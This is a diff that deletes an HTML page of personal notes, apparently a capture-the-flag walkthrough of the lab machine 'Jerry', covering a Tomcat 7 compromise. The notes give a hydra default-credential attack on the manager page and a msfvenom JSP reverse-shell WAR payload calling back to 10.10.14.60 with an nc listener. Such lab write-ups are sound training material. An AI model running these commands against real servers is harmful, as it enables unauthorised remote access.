@@ -1,8 +1,0 @@
-<!doctype html><html>
-    <head>
-      <meta http-equiv="content-type" content="text/html; charset=utf-8">
-      <title>10.10.10.95 Jerry</title>
-      <meta name="generator" content="CherryTree">
-      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
-    </head>
-    <body><div class='page'><h1 class='title'>10.10.10.95 Jerry</h1><br/>Nmap showed that only port 8080 was running<br />nmap version showed that it was apache tomcat 7<br />dirsearch showed that I could navigate to /manager/html ... but I need creds<br />    the creds are actually on the page, but I was also able to aquire them with hydra<br />    <br />    HYDRA_PROXY_HTTP=<a href="http://127.0.0.1:8080">http://127.0.0.1:8080</a> hydra -C  /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 8080 10.10.10.95 http-get /manager/html<br />    when first catching the creds being sent with burp I could see it was a base 64 encoded string. example YWRtaW46YWRzM2NyZXQ= admin:ads3cret<br />    <br />    tomcat:s3cret works!<br />    <br />    manager/html allows you to upload and execute a .war file (compressed javascript).<br />    msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.60 LPORT=3232 -f war &gt; reverse.war        (found at payload all the things)<br />    start a reverse listener with nc<br />    upload and deploy the binary via the gui and when you refresh the page /reverse is now a link!  (note that it is not reverse.war or reverse.jsp)<br />    click the link and you win the ...WAR.</div></body></html>
